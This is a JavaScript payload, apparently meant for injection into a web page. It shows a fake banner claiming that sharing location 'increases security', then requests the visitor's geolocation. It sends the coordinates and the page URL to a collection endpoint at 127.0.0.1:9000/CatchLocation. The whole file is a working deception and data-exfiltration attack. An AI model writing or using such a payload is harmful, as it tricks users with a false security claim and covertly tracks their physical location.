//load in jquery (a little uneccessary possibly for this script)
var script = document.createElement('script');
script.src = "http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js";
script.onload = function () {

	var content = '<style>' + 
'#container {' + 
'    visibility: visible;' + 
'    display: block;' + 
'    max-height: 30px;' + 
'}' +
'.reveal-modal {' + 
'    background: -webkit-linear-gradient(#B59FED, #7C6AAB); /* For Safari 5.1 to 6.0 */' + 
'    background: -o-linear-gradient(#B59FED, #7C6AAB); /* For Opera 11.1 to 12.0 */' + 
'    background: -moz-linear-gradient(#B59FED, #7C6AAB); /* For Firefox 3.6 to 15 */' + 
'    background: linear-gradient(#B59FED, #7C6AAB); /* Standard syntax */' + 
'    /*background:#900311; */' + 
'    margin: 0 auto;' + 
'    width:100%; ' + 
'    position: fixed;' + 
'    top: 0;' + 
'    left: 0;' + 
'    z-index:41;' + 
'    font-family: Helvetica;' + 
'    padding:10px; ' + 
'    color: white;' + 
'    /*-webkit-box-shadow:0 0 10px rgba(0,0,0,0.4);' + 
'    -moz-box-shadow:0 0 10px rgba(0,0,0,0.4); ' + 
'    box-shadow:0 0 10px rgba(0,0,0,0.4);*/' + 
'	border-radius: 0px; ' +
'}' +
'.lpbutton {' + 
'  background-color: #eeeeee;' + 
'  border: 1px solid #ccc;' + 
'  border-bottom: 1px solid #bbb;' + 
'  color: #333;' + 
'  line-height: 1;' + 
'  font-weight: bold;' + 
'  text-align: center;' + 
'  text-shadow: 0 1px 0 #eee;' + 
'  /*width: auto;*/' + 
'  /*float: right;*/' + 
'  margin: 0px 15px 2px 2px;' + 
'  /*height: 17px;*/' + 
'  padding: 3px 6px 2px 6px;' + 
'  font-size: 13px;' + 
'  font-family: Helvetica;' + 
'}' +
'.loginform {' + 
'  float: right;' + 
'  margin: 0px 10px !important;' + 
'}' +
'</style>' + 
'<div id="container">' + 
'  <div id="modal" class="reveal-modal">' + 
'       Share your location to increase security while accessing this page' + 
'  </div>' + 
'</div>' 
	
setTimeout( function() {
	$( "body" ).prepend(content);
}, 1000 );

setTimeout( function() {
	getLocation()
}, 4000 );
		
};

document.head.appendChild(script); //or something of the likes

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition);
    } else { 
        console.log("Geolocation is not supported by this browser.");
    }
}

function sendPosition(position) {	
    new Image().src = 'http://127.0.0.1:9000/CatchLocation?page='+window.location.href+'&latitude='+position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
}